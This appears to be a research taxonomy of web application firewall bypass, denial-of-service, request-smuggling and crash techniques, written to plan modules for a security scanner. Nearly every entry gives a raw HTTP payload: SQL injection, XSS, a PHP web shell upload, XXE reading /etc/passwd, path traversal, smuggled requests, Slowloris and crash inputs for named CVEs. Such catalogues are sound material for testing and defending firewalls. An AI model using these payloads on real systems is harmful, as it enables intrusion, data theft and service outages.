# WAF Attack Taxonomy -- Comprehensive Bypass, Destruction, and Evasion Techniques

Research compiled from academic papers, CVE databases, PortSwigger research, CRS project advisories, and real-world penetration testing reports (2024-2025).

---

## Category 1: Rule Bypass (Get Malicious Payloads Past the WAF)

### 1.1 Double URL Encoding

**How it works:** WAFs that decode URL encoding only once before pattern matching will miss payloads encoded twice. The backend decodes both layers, receiving the original malicious payload.

**Example:**
```http
GET /search?q=%2527%2520OR%25201%253D1-- HTTP/1.1
Host: target.com
```
Decoded once: `%27%20OR%201%3D1--`
Decoded twice: `' OR 1=1--`

**Vulnerable WAFs:** ModSecurity (without recursive decoding), NAXSI, many commercial WAFs
**Expected outcome:** SQLi payload bypasses signature detection
**Glitch implementation:** Already in `internal/scanner/evasion/encoding.go` as `DoubleURLEncode()`. Server WAF proxy should test recursive decode depth.

---

### 1.2 Unicode Encoding (%uXXXX and Overlong UTF-8)

**How it works:** WAFs may not normalize Unicode escapes before matching. The `%uXXXX` format (IIS-specific) and overlong UTF-8 sequences (e.g., `%C0%AF` for `/`) represent valid characters that bypass ASCII pattern matching.

**Example:**
```http
GET /search?q=%u0027%u004FR%u00201=1 HTTP/1.1
Host: target.com
```
Or overlong UTF-8:
```http
GET /%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd HTTP/1.1
Host: target.com
```

**Vulnerable WAFs:** IIS-based WAFs, NAXSI, WAFs without Unicode normalization
**Expected outcome:** Bypass keyword detection entirely
**Glitch implementation:** `UnicodeEncode()` exists in evasion/encoding.go. Add `%uXXXX` IIS-style and overlong UTF-8 variants.

---

### 1.3 HTML Entity Encoding with Leading Zeros (CVE-2025-27110)

**How it works:** libmodsecurity3 fails to decode HTML entities containing leading zeros. `&#0000060;` (representing `<`) is not recognized by ModSecurity but is decoded by browsers and backend frameworks.

**Example:**
```http
POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

body=&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;
```

**Vulnerable WAFs:** ModSecurity/libmodsecurity3 v3.0.13 (CVE-2025-27110, CVSS 7.9)
**Expected outcome:** XSS payload passes through WAF undetected
**Glitch implementation:** Add `HTMLEntityEncodeWithLeadingZeros()` to encoding.go. Vary zero count (1-7 leading zeros).

---

### 1.4 Chunked Transfer Encoding Fragmentation

**How it works:** Split a malicious payload across multiple chunk boundaries. WAFs that inspect each chunk independently miss cross-chunk patterns. About 15-20% of WAFs fail to reassemble chunks before inspection.

**Example:**
```http
POST /login HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

3
use
7
rname=a
11
dmin' OR '1'='1
0

```

**Vulnerable WAFs:** ~15% of WAFs ignore Transfer-Encoding when Content-Length is also present; ~20% fail with malformed TE values
**Expected outcome:** SQLi bypasses pattern matching across chunk boundaries
**Glitch implementation:** Add `ChunkedFragmenter` to scanner evasion. Server proxy WAF should test chunk reassembly.

---

### 1.5 Mixed Content-Length and Transfer-Encoding

**How it works:** When both `Content-Length` and `Transfer-Encoding: chunked` are present, RFC 7230 says TE takes precedence. But ~15% of WAFs process CL instead, seeing a truncated (clean) body while the backend processes the chunked (malicious) body.

**Example:**
```http
POST /api/data HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=delete&id=1
```

**Vulnerable WAFs:** ~15% of tested firewalls (HTTP Evader research)
**Expected outcome:** Request smuggling past WAF
**Glitch implementation:** Scanner attack module should send dual-header requests. Proxy WAF should enforce TE precedence.

---

### 1.6 Malformed Transfer-Encoding Values

**How it works:** Values like `chunked foo`, `x chunked`, or `Transfer-Encoding: \tchunked` are accepted by permissive parsers (Firefox, Safari, many backends) but rejected or ignored by strict WAFs.

**Example:**
```http
POST /search HTTP/1.1
Transfer-Encoding: xchunked

5
' OR
5
 1=1-
2
-
0

```

**Vulnerable WAFs:** ~25% of firewalls accept malformed TE values (HTTP Evader)
**Expected outcome:** WAF ignores chunked body, backend processes it
**Glitch implementation:** Add TE value fuzzer to protocol attack module with variants: `chunked\x00`, `\tchunked`, `chunked;ext`, `CHUNKED`.

---

### 1.7 HTTP/2 CRLF Header Injection

**How it works:** HTTP/2's binary framing allows header values containing `\r\n`. When a front-end downgrades to HTTP/1.1, these become header separators, letting attackers inject arbitrary headers invisible to the WAF.

**Example:**
```
:method POST
:path /api/users
:authority target.com
foo: bar\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

**Vulnerable WAFs:** Netlify CDN, many reverse proxies doing H2->H1 downgrade
**Expected outcome:** Request smuggling past WAF via injected headers
**Glitch implementation:** Scanner H2 attack module should inject CRLF in header values. Requires raw H2 framing.

---

### 1.8 HTTP/2 Pseudo-Header Abuse

**How it works:** HTTP/2 `:method` pseudo-header can contain spaces on permissive front-ends (e.g., Apache mod_proxy), allowing request line injection when downgraded to HTTP/1.

**Example:**
```
:method GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n
:path /legit
:authority target.com
```
Downgraded to: `GET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /legit HTTP/1.1`

**Vulnerable WAFs:** Apache mod_proxy, any H2->H1 proxy that trusts pseudo-headers
**Expected outcome:** Full request line injection, WAF sees `/legit`, backend sees `/admin`
**Glitch implementation:** Add H2 pseudo-header injection to scanner attacks/h3.go or new h2_smuggling.go.

---

### 1.9 Content-Type Charset Confusion (CVE-2026-21876)

**How it works:** WAFs typically inspect bodies assuming UTF-8. Using `charset=utf-7` or `charset=ibm037` encodes payloads in alternate character sets that the WAF cannot decode but the backend can.

**Example:**
```http
POST /api/data HTTP/1.1
Content-Type: application/json; charset=ibm037

%A7%A4%95%89%96%95@%A2%85%93%85%83%A3@%F1%6B%F2%6B%F3
```
(IBM 037 EBCDIC encoding of `union select 1,2,3`)

Or UTF-7:
```http
POST /comment HTTP/1.1
Content-Type: text/html; charset=utf-7

+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**Vulnerable WAFs:** CRS (CVE-2026-21876, CVSS 9.3), ModSecurity, most signature-based WAFs
**Expected outcome:** Payload invisible to WAF, decoded by backend
**Glitch implementation:** Add `IBM037Encode()`, `UTF7Encode()`, `ShiftJISEncode()` to encoding.go. Include dual-charset Content-Type (`charset=utf-8;charset=utf-7`).

---

### 1.10 Multipart Boundary Manipulation (WAFFLED Research)

**How it works:** RFC 2231 allows boundary parameter continuation (`boundary*0=real-;boundary*1=boundary`). WAFs parse the first boundary while backends concatenate continuations, creating parser differential.

**Example:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=FAKE; boundary*0=REAL; boundary*1=BOUNDARY

--REALBOUNDARY
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
--REALBOUNDARY--
```

**Vulnerable WAFs:** Cloudflare, Azure, Google Cloud Armor, ModSecurity (WAFFLED paper: 1,207 unique bypasses found)
**Expected outcome:** File upload bypasses WAF, malicious content reaches backend
**Glitch implementation:** Add `MultipartBoundaryFuzzer` with RFC 2231 continuation, null bytes in boundaries, missing CRLF, duplicate boundary params.

---

### 1.11 HTTP Parameter Pollution (HPP)

**How it works:** Duplicate parameter names are handled inconsistently. ASP.NET concatenates with commas, PHP takes last value, Java/Spring takes first. WAFs typically check each value independently.

**Example:**
```http
GET /search?q=legitimate&q=' OR '1'='1 HTTP/1.1
Host: target.com
```
ASP.NET sees: `q=legitimate,' OR '1'='1` (concatenated)
WAF checks: `q=legitimate` and `q=' OR '1'='1` separately -- may miss the combined injection context.

Or for XSS:
```http
GET /page?input=1'&input=alert(1)&input='2 HTTP/1.1
```
ASP.NET produces: `1',alert(1),'2` -- valid JavaScript via comma operator.

**Vulnerable WAFs:** 70.6% of WAF configurations bypassed with sophisticated HPP (Ethiack research). Only 3/17 major WAFs blocked it.
**Expected outcome:** XSS/SQLi assembled from fragments across duplicate parameters
**Glitch implementation:** Add `HPPAttacker` to scanner attacks. Proxy WAF should normalize duplicate params.

---

### 1.12 SQL Comment Injection

**How it works:** Insert inline SQL comments (`/**/`) between keywords to break WAF pattern matching while keeping SQL syntax valid. MySQL also supports `/*!*/` for version-conditional comments.

**Example:**
```http
GET /products?id=1'/*!50000UNI*//*!50000ON*//*!50000SEL*//*!50000ECT*/1,2,3-- HTTP/1.1
Host: target.com
```

**Vulnerable WAFs:** Signature-based WAFs matching `UNION\s+SELECT` patterns
**Expected outcome:** SQLi bypasses keyword matching
**Glitch implementation:** Already partially in `commentInject()`. Extend with MySQL version comments `/*!50000*/` and nested comments.

---

### 1.13 Case Manipulation and Keyword Fragmentation

**How it works:** Mix upper/lowercase in SQL/HTML keywords. Use string concatenation functions to build keywords at runtime.

**Example:**
```http
GET /search?q=' uNiOn SeLeCt 1,2,3-- HTTP/1.1
Host: target.com
```
Or with concatenation:
```http
GET /search?q=' UNION SEL%45CT 1,2,3-- HTTP/1.1
```

**Vulnerable WAFs:** WAFs with case-sensitive regex (no `(?i)` flag)
**Expected outcome:** Keyword detection bypassed
**Glitch implementation:** `mixedCaseEncode()` exists. Add selective character encoding within keywords.

---

### 1.14 Null Byte Injection

**How it works:** WAFs using C-style string functions (strstr, strcmp) stop processing at null bytes (`\x00`). Content after the null byte is invisible to the WAF but processed by the backend.

**Example:**
```http
POST /api/data HTTP/1.1
Content-Type: application/json

{"name": "safe\x00<script>alert(1)</script>"}
```

**Vulnerable WAFs:** NAXSI (pre-1.1a, Synacktiv bypass), ModSecurity (older versions), any WAF using C string functions
**Expected outcome:** Everything after `\x00` is invisible to WAF
**Glitch implementation:** `nullByteInject()` exists. Add positional variants: null before payload, within keywords, in header values.

---

## Category 2: Resource Exhaustion (Make the WAF Unable to Process)

### 2.1 Slowloris (Slow Headers)

**How it works:** Open many connections and send HTTP headers very slowly (one header line every 10-15 seconds), never completing the request. Each connection holds a server/WAF thread indefinitely.

**Example:**
```
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Custom-1: value\r\n
[wait 10 seconds]
X-Custom-2: value\r\n
[wait 10 seconds]
... [never send final \r\n]
```

**Vulnerable WAFs:** Apache-based WAFs, thread-per-connection architectures. NOT effective against event-driven (nginx, HAProxy).
**Expected outcome:** WAF connection pool exhaustion, legitimate requests dropped
**Glitch implementation:** Already in `internal/scanner/attacks/slowhttp.go`. Enhance with variable timing patterns to evade Slowloris detection.

---

### 2.2 Slow POST (R.U.D.Y.)

**How it works:** Send a legitimate POST with a large Content-Length, then transmit the body one byte at a time. The WAF must hold the connection and buffer open waiting for the complete body.

**Example:**
```http
POST /api/data HTTP/1.1
Host: target.com
Content-Length: 100000
Content-Type: application/x-www-form-urlencoded

a=[send 1 byte every 10 seconds for hours]
```

**Vulnerable WAFs:** Any WAF that buffers complete bodies before inspection
**Expected outcome:** Memory and connection exhaustion
**Glitch implementation:** Add `SlowPOSTAttack` to slowhttp.go with configurable byte rate and Content-Length inflation.

---

### 2.3 Slow Read

**How it works:** Send a complete request but read the response extremely slowly (advertising tiny TCP window sizes). The server/WAF must hold response buffers in memory for each slow-read connection.

**Example:**
```
1. Send complete GET / HTTP/1.1
2. TCP Window Size: 1 byte
3. ACK each byte with 10-second delay
4. Multiply across hundreds of connections
```

**Vulnerable WAFs:** WAFs that buffer responses, reverse proxies holding response data
**Expected outcome:** Memory exhaustion from accumulated response buffers
**Glitch implementation:** Add `SlowReadAttack` using raw TCP with minimal window advertisement. Requires raw socket access.

---

### 2.4 ReDoS Against WAF Rules (CVE-2019-11387 et al.)

**How it works:** Craft input that triggers exponential backtracking in WAF regex rules. ModSecurity 3.x removed PCRE match limits that 2.x had, making it especially vulnerable. Even one request can pin a CPU core for minutes.

**Example:**
```http
GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! HTTP/1.1
Host: target.com
```
(Crafted to trigger backtracking in rules like `(?i)(a+)+b` or complex SQL injection patterns)

Specific CRS rule 942360 was found vulnerable to ReDoS payloads.

**Vulnerable WAFs:** ModSecurity 3.x (no PCRE limits), CRS rules pre-3.1.1 (CVE-2019-11387, CVE-2019-11388, CVE-2019-11389, CVE-2019-11390, CVE-2019-11391)
**Expected outcome:** WAF CPU exhaustion, worker thread hang, request processing stops
**Glitch implementation:** Add `ReDoSAttacker` that generates payloads targeting common WAF regex patterns -- long strings of repeating characters followed by non-matching terminators. Server proxy WAF should have regex timeout protection.

---

### 2.5 Large Header Flood

**How it works:** Send requests with many large headers (e.g., 100 headers of 8KB each) that force the WAF to allocate memory for inspection. Multiply across concurrent connections.

**Example:**
```http
GET / HTTP/1.1
Host: target.com
X-Pad-001: AAAAAA...[8KB]...AAAA
X-Pad-002: AAAAAA...[8KB]...AAAA
... [100 headers]
X-Pad-100: AAAAAA...[8KB]...AAAA
```

**Vulnerable WAFs:** WAFs without header count/size limits, WAFs that inspect all headers
**Expected outcome:** Memory exhaustion, potential OOM crash
**Glitch implementation:** Add `HeaderFloodAttack` to scanner. Configure header count, size, and concurrency. Server WAF should enforce limits.

---

### 2.6 Deep JSON/XML Nesting

**How it works:** Deeply nested JSON objects or XML elements force recursive parsing. WAFs with recursive parsers can exhaust stack space or CPU processing deeply nested structures.

**Example (JSON):**
```http
POST /api/data HTTP/1.1
Content-Type: application/json

{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":
... [10,000 levels deep]
"payload":"' OR 1=1--"
}}}}}}}}}}
```

**Example (XML Bomb / Billion Laughs):**
```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ... [expand exponentially]
]>
<data>&lol9;</data>
```

**Vulnerable WAFs:** WAFs with recursive JSON/XML parsers, WAFs processing entity expansion
**Expected outcome:** Stack overflow, CPU exhaustion, memory exhaustion (XML bomb expands to GB)
**Glitch implementation:** Already have `json_depth_bomb` and `xml_bomb` in error generator. Add scanner attacks that send these as request bodies to WAFs.

---

### 2.7 Infinite Chunked Transfer

**How it works:** Send chunked transfer encoding that never terminates (no `0\r\n\r\n` terminator). The WAF must buffer chunks indefinitely waiting for the complete body.

**Example:**
```http
POST /api/data HTTP/1.1
Transfer-Encoding: chunked

A
aaaaaaaaaa
A
bbbbbbbbbb
... [repeat forever, never send 0 terminator]
```

**Vulnerable WAFs:** WAFs that buffer entire chunked body before inspection
**Expected outcome:** Memory exhaustion, connection pool depletion
**Glitch implementation:** Already have `infinite_chunked` error type. Add as scanner attack against WAF targets.

---

### 2.8 WebSocket Upgrade Flood

**How it works:** Send many WebSocket upgrade requests. Most WAFs don't inspect WebSocket traffic beyond the initial handshake. Once upgraded, all traffic bypasses WAF rules. Flooding with upgrades can also exhaust WAF connection tracking.

**Example:**
```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
(Repeat with hundreds of connections, then send attack payloads over WebSocket)

**Vulnerable WAFs:** Most WAFs that don't inspect post-upgrade WebSocket frames
**Expected outcome:** Attack traffic bypasses WAF entirely via WebSocket channel
**Glitch implementation:** Add `WebSocketFloodAttack` to scanner. Server already has websocket honeypots in `internal/websocket/`.

---

### 2.9 Response Filter DoS (RFDoS)

**How it works:** Inject strings that match WAF response-inspection rules (e.g., SQL error messages) into user-controlled content (comments, profile fields). When any user views the page, the WAF blocks the response, causing DoS for all users.

**Example:**
```http
POST /api/comments HTTP/1.1
Content-Type: application/json

{"comment": "Great product! I tested it with ORA-1234 and Dynamic SQL Error codes."}
```
When any user loads the comments page, the WAF's response body inspection matches `ORA-1234` (Oracle error pattern) and blocks the entire page.

Other trigger strings: `You have an error in your SQL syntax`, `ASL-CONFIG-FILE`, `Access Database Engine`, `DB2 SQL error`

**Vulnerable WAFs:** CRS (OWASP Core Rule Set), Comodo Rules, Atomicorp Rules -- affects 0.4-1.5% of WordPress sites
**Expected outcome:** Persistent DoS -- page blocked for all users until the injected content is removed
**Glitch implementation:** Add `RFDoSAttacker` to scanner that injects WAF response-rule trigger strings into form fields. Server vuln endpoints should demonstrate this pattern.

---

## Category 3: Parser Confusion (Make the WAF Parse Differently Than Backend)

### 3.1 CL.TE Request Smuggling

**How it works:** Front-end (WAF) uses Content-Length, back-end uses Transfer-Encoding. The WAF reads CL bytes and forwards, but the backend interprets chunked encoding and sees a second smuggled request.

**Example:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```
WAF sees: 13-byte body (valid, clean)
Backend sees: chunked body terminates at `0`, then a new `GET /admin` request

**Vulnerable WAFs:** Any WAF that prioritizes CL over TE
**Expected outcome:** Smuggled request bypasses WAF completely
**Glitch implementation:** Add `CL_TE_Smuggler` to protocol attack module. Proxy WAF should reject ambiguous CL/TE.

---

### 3.2 TE.CL Request Smuggling

**How it works:** Front-end (WAF) uses Transfer-Encoding, back-end uses Content-Length. Reversed from CL.TE.

**Example:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```
WAF sees: chunked body `SMUGGLED`, terminated by `0`
Backend sees: 3 bytes of body (`8\r\n`), then `SMUGGLED\r\n0\r\n` as next request

**Vulnerable WAFs:** Any WAF that prioritizes TE over CL when backend does opposite
**Expected outcome:** Request smuggling
**Glitch implementation:** Add `TE_CL_Smuggler` alongside CL.TE variant.

---

### 3.3 TE.TE Request Smuggling (Obfuscated TE)

**How it works:** Both front-end and back-end support TE, but one can be tricked into not recognizing an obfuscated Transfer-Encoding header, falling back to Content-Length.

**Example:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

8a
GET /admin HTTP/1.1
Host: target.com

0

```
Obfuscation variants:
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked` (space before colon)
- `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
- `Transfer-Encoding[\x0b]: chunked` (vertical tab)
- `X: x[\r\n]Transfer-Encoding: chunked` (CRLF prefix injection)

**Vulnerable WAFs:** Varies by obfuscation variant; ~20% of WAFs affected
**Expected outcome:** One side processes chunked, other processes CL -- smuggling occurs
**Glitch implementation:** Add TE obfuscation fuzzer with all variant types.

---

### 3.4 H2.CL Desync (HTTP/2 Content-Length)

**How it works:** HTTP/2 uses frame lengths, not Content-Length headers. But when downgraded to HTTP/1, some proxies trust an attacker-supplied Content-Length that disagrees with the actual body length.

**Example (Netflix vulnerability):**
```
:method POST
:path /n
:authority www.netflix.com
content-length: 4

abcdGET /admin HTTP/1.1
Host: target.com
Foo: bar
```
H2 front-end sees: frame with `abcdGET /admin...` as body
H1 back-end sees: 4-byte body `abcd`, then `GET /admin...` as next request

**Vulnerable WAFs:** Netflix (patched), AWS ALB, any H2->H1 downgrading proxy
**Expected outcome:** Request smuggling via protocol downgrade
**Glitch implementation:** Requires HTTP/2 client support in scanner. Add H2 desync module.

---

### 3.5 H2.TE Desync (HTTP/2 Transfer-Encoding)

**How it works:** RFC 9113 prohibits Transfer-Encoding in HTTP/2, but some implementations don't validate this. When downgraded to HTTP/1, the TE header enables classic CL.TE smuggling.

**Example (AWS ALB vulnerability):**
```
:method POST
:path /identity/XUI
:authority target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: evil.com
```

**Vulnerable WAFs:** AWS Application Load Balancer, other non-validating H2 implementations
**Expected outcome:** Smuggled request via H2->H1 downgrade with injected TE
**Glitch implementation:** Add alongside H2.CL desync module.

---

### 3.6 Multipart Parser Differential

**How it works:** WAFs and backends parse multipart/form-data boundaries, Content-Disposition headers, and field names differently. The WAFFLED paper found 1,207 unique bypass instances across 24 mutation classes.

**Key mutations:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

PAYLOAD_HERE
------BOUNDARY--
```

**Mutation examples:**
- Remove `\r\n` before boundary (some parsers accept `\n` only)
- Insert null byte in boundary value
- Duplicate Content-Disposition with different names
- Use RFC 2231 parameter continuation for boundary
- Modify separator between header lines
- Remove Content-Type from individual parts

**Vulnerable WAFs:** Cloudflare, Azure, Google Cloud Armor, ModSecurity (WAFFLED paper). AWS WAF was resistant.
**Expected outcome:** WAF parses wrong field/boundary, misses payload in correct field
**Glitch implementation:** Add `MultipartFuzzer` to scanner with all 24 mutation classes from WAFFLED taxonomy.

---

### 3.7 Duplicate Headers with Different Values

**How it works:** When a request contains duplicate headers (e.g., two `Content-Type` or two `Host` headers), the WAF and backend may pick different values.

**Example:**
```http
POST /api HTTP/1.1
Host: legitimate.com
Host: evil.com
Content-Type: text/plain
Content-Type: application/xml

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
```
WAF uses first `Content-Type: text/plain`, skips XML parsing.
Backend uses last `Content-Type: application/xml`, processes XXE.

**Vulnerable WAFs:** WAFs that take first header value when backend takes last (or vice versa)
**Expected outcome:** WAF applies wrong content-type rules
**Glitch implementation:** Add `DuplicateHeaderAttack` to scanner protocol module.

---

### 3.8 CRLF Injection in Headers

**How it works:** Inject `\r\n` sequences into header values to create fake headers. The WAF may see one header, but the backend parses the injected newline as a header separator.

**Example:**
```http
GET /page HTTP/1.1
Host: target.com
X-Custom: value\r\nX-Injected: malicious\r\nTransfer-Encoding: chunked
```

**Vulnerable WAFs:** WAFs that don't validate header values for CRLF characters
**Expected outcome:** Header injection enabling smuggling or response splitting
**Glitch implementation:** Already in `internal/headers/corruption.go` (CVE-2019-9740 CRLF injection). Extend to scanner attacks.

---

### 3.9 Path Traversal with Encoding Variants

**How it works:** Use multiple encoding layers for `../` path traversal that the WAF doesn't normalize but the backend does.

**Example:**
```http
GET /static/..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: target.com
```
Or using backslash (Windows/IIS):
```http
GET /static/..\..\..\..\windows\win.ini HTTP/1.1
Host: target.com
```
Or using URL-encoded dots:
```http
GET /static/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: target.com
```

**Vulnerable WAFs:** WAFs that decode only one layer, WAFs that don't normalize backslashes
**Expected outcome:** Directory traversal past WAF path rules
**Glitch implementation:** Already in scanner encoding. Add backslash variants and triple encoding.

---

### 3.10 ModSecurity URL Decode Path Bypass (CVE-2024-1019)

**How it works:** ModSecurity 3.x decodes URLs before splitting the path, allowing `%3F` (encoded `?`) to trick ModSecurity into choosing the wrong path/query boundary. The attacker controls where the WAF thinks the path ends.

**Example:**
```http
GET /allowed-path%3F/../../admin?action=delete HTTP/1.1
Host: target.com
```
ModSecurity sees path: `/allowed-path` (stops at decoded `?`)
Backend sees path: `/allowed-path%3F/../../admin` (literal `%3F` in path, `?` starts at `action=delete`)

**Vulnerable WAFs:** ModSecurity/libmodsecurity 3.0.0 to 3.0.11 (CVE-2024-1019)
**Expected outcome:** Path-based WAF rules completely bypassed
**Glitch implementation:** Add `ModSecPathBypass` attack that uses `%3F` to split paths at attacker-chosen positions.

---

### 3.11 Coraza URI Parser Confusion (CVE-2025-29914)

**How it works:** Coraza WAF uses Go's `url.Parse()` which treats `//host/path` as an absolute URL with `host` as the hostname. The REQUEST_FILENAME variable gets set to `/path` instead of `//host/path`, bypassing path-based rules.

**Example:**
```http
GET //bar/uploads/shell.php?cmd=id HTTP/1.1
Host: target.com
```
Coraza sets REQUEST_FILENAME to `/uploads/shell.php` (missing `//bar` prefix)
Rules protecting `/bar/uploads/` don't match.

**Vulnerable WAFs:** Coraza WAF < 3.3.3 (CVE-2025-29914)
**Expected outcome:** Path-based rule bypass, potential RCE if protecting file uploads
**Glitch implementation:** Add `CorazaPathBypass` using double-slash prefix paths.

---

## Category 4: WAF Crash/Hang (Actually Break the WAF Process)

### 4.1 ModSecurity Cookie Parsing Crash (CVE-2019-19886)

**How it works:** A malformed Cookie header causes an out_of_range exception in libModSecurity 3.x's cookie parser. When used with nginx, this crashes the nginx worker thread.

**Example:**
```http
GET / HTTP/1.1
Host: target.com
Cookie: =
```
(Cookie with empty name and empty value, or other malformed cookie formats)

**Vulnerable WAFs:** ModSecurity 3.0.0 - 3.0.3 (CVSS 7.5)
**Expected outcome:** nginx worker crash, service disruption
**Glitch implementation:** Add `CookieCrash` attack sending malformed cookie variants: `Cookie: =`, `Cookie: ====`, `Cookie: \x00name=value`, `Cookie: name\x00=value`.

---

### 4.2 ModSecurity DoS via Request Body (CVE-2024-46292)

**How it works:** Specific request body patterns trigger excessive processing in ModSecurity 3.0.12 when used with CRS 4.1, causing denial of service.

**Example:**
```http
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: [large]

[crafted body triggering CRS 4.1 rule processing overhead]
```

**Vulnerable WAFs:** ModSecurity 3.0.12 + CRS 4.1 (CVE-2024-46292)
**Expected outcome:** WAF DoS, request processing hangs
**Glitch implementation:** Add ModSecurity-specific DoS payloads to scanner.

---

### 4.3 ModSecurity DoS via Empty XML Tags (CVE-2025-52891)

**How it works:** Specific XML body patterns with empty or malformed tags trigger a DoS condition in ModSecurity's XML parser.

**Example:**
```http
POST /api HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<root><><></><></></root>
```

**Vulnerable WAFs:** ModSecurity (recent versions, fixed in latest release)
**Expected outcome:** WAF crash or hang during XML parsing
**Glitch implementation:** Add XML parser crash payloads to scanner: empty tags, unclosed tags, deeply nested empty elements.

---

### 4.4 NAXSI Null Byte Filter Bypass/Crash

**How it works:** NAXSI's `strfaststr` function stops at null bytes. Inserting `\x00` in request bodies causes the WAF to analyze only the content before the null byte, completely ignoring everything after.

**Example (JSON body):**
```http
POST /api HTTP/1.1
Content-Type: application/json

{"key": "safe\x00<script>alert(1)</script>"}
```

**Example (Multipart):**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----B

------B
Content-Disposition: form-data; name="data"

<script>alert(1)</script> \x00 SAFE
------B--
```

**Vulnerable WAFs:** NAXSI < 1.1a (Synacktiv findings)
**Expected outcome:** Complete filter bypass via null byte truncation
**Glitch implementation:** Add NAXSI-specific null byte injection variants to scanner.

---

### 4.5 Integer Overflow in Content-Length

**How it works:** Send a Content-Length value that overflows integer storage (e.g., `Content-Length: 18446744073709551616` for uint64 overflow, or negative values). WAFs using fixed-width integers may wrap around, allocating wrong buffer sizes.

**Example:**
```http
POST /api HTTP/1.1
Content-Length: 4294967295
Content-Type: application/x-www-form-urlencoded

actual_small_body_with_sqli=' OR 1=1--
```
Or negative:
```http
POST /api HTTP/1.1
Content-Length: -1
Content-Type: application/x-www-form-urlencoded

payload
```

**Vulnerable WAFs:** WAFs with 32-bit integer parsing for Content-Length
**Expected outcome:** Buffer overflow, crash, or body parsing bypass
**Glitch implementation:** Add `ContentLengthOverflow` attack with values: `2^31-1`, `2^31`, `2^32-1`, `2^32`, `2^63-1`, `2^64-1`, `-1`, `0`, negative values.

---

### 4.6 Regex Engine Crash via Malformed Patterns

**How it works:** Some WAFs allow user-controlled regex patterns (e.g., in search features). Submitting patterns with extreme backtracking, nested quantifiers, or invalid syntax can crash the regex engine.

**Example payloads for ReDoS:**
```
(a+)+$
(a|aa)+$
(a|a?)+$
([a-zA-Z]+)*[0-9]
(.*a){25}
```
Applied as: `GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaa!`

**Vulnerable WAFs:** Any WAF using PCRE without match limits (especially ModSecurity 3.x)
**Expected outcome:** CPU exhaustion, thread hang, potential crash
**Glitch implementation:** Add `ReDoSPayloadGenerator` that creates strings triggering exponential backtracking for common WAF rule patterns.

---

### 4.7 65KB Header Overflow

**How it works:** Send a single header value exceeding 65KB (common buffer size). Some WAFs allocate fixed-size header buffers and crash on overflow.

**Example:**
```http
GET / HTTP/1.1
Host: target.com
X-Overflow: AAAAAA...[65536+ bytes]...AAAA
```

**Vulnerable WAFs:** WAFs with fixed header buffers, older ModSecurity versions
**Expected outcome:** Buffer overflow, crash, or header truncation (allowing payload after truncation point)
**Glitch implementation:** Already in `internal/headers/corruption.go` as 65KB header overflow. Add to scanner as active attack.

---

### 4.8 Chunk Overflow / Malformed Chunk Sizes

**How it works:** Send chunk sizes with invalid formats: negative hex, overflow values, non-hex characters. WAFs parsing chunk sizes may crash or misinterpret body boundaries.

**Example:**
```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

FFFFFFFFFFFFFFFF
[tiny body with SQLi]
0

```
Or with chunk extensions containing special characters:
```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

5;ext="\r\nEvil: header"
hello
0

```

**Vulnerable WAFs:** WAFs that don't validate chunk size ranges
**Expected outcome:** Integer overflow in chunk parsing, buffer overflow, or header injection via chunk extensions
**Glitch implementation:** Already have `chunk_overflow` error type. Add chunk extension injection variants.

---

## Category 5: Detection Evasion (Operate Under WAF Radar)

### 5.1 Slow Exfiltration (Below Rate Limits)

**How it works:** Space requests at intervals just below WAF rate limit thresholds (typically 10-100 req/sec). Use variable timing with jitter to avoid pattern detection.

**Example pattern:**
```
Request 1 at T+0
Request 2 at T+1.3s
Request 3 at T+2.7s
Request 4 at T+3.1s
... [random 0.5-3.0s intervals, average below threshold]
```

**Vulnerable WAFs:** WAFs with fixed-window rate limiting (vs. sliding window)
**Expected outcome:** Sustained scanning below detection threshold
